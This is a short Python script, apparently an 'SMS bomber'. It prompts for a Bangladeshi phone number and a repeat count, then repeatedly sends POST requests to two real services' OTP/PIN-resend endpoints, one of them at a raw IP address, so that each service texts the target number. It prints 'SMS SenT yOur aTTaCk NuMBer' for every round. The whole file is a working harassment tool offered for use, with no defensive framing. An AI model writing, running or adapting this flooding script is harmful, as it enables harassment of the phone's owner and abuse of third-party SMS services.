import requests
from requests.structures import CaseInsensitiveDict

green = '\033[1;32m'
end = '\033[0m'
print (green+"""  _   _ ____    ____  _   _       _  ___ _ ____  
 | | | |  _ \  / ___|| | | | __ _| |/ (_|_) __ ) 
 | |_| | | | | \___ \| |_| |/ _` | ' /| | |  _ \ 
 |  _  | |_| |  ___) |  _  | (_| | . \| | | |_) |
 |_| |_|____/  |____/|_| |_|\__,_|_|\_\_|_|____/ 
                                                  """+end)
                                                  
number  = str(input("[>] Enter The BD Number: "))
amount = int(input("[>] Enter The Amount: "))

url1 = "https://api.meenaclick.com/api/front/sms/send/pin?'"

headers1 = CaseInsensitiveDict()
headers1["Content-Type"] = "application/x-www-form-urlencoded"

data1 = "cell_phone="+number


url2 = "http://128.199.215.102/api/otpresend"

headers2 = CaseInsensitiveDict()
headers2["Content-Type"] = "application/x-www-form-urlencoded"

data2 = "phone="+number


for j in range(amount):
	
	resp1 = requests.post(url1, headers=headers1, data=data1)
	
	resp2 = requests.post(url2, headers=headers2, data=data2)
	
	print (str(j+1)+" SMS SenT yOur aTTaCk NuMBer")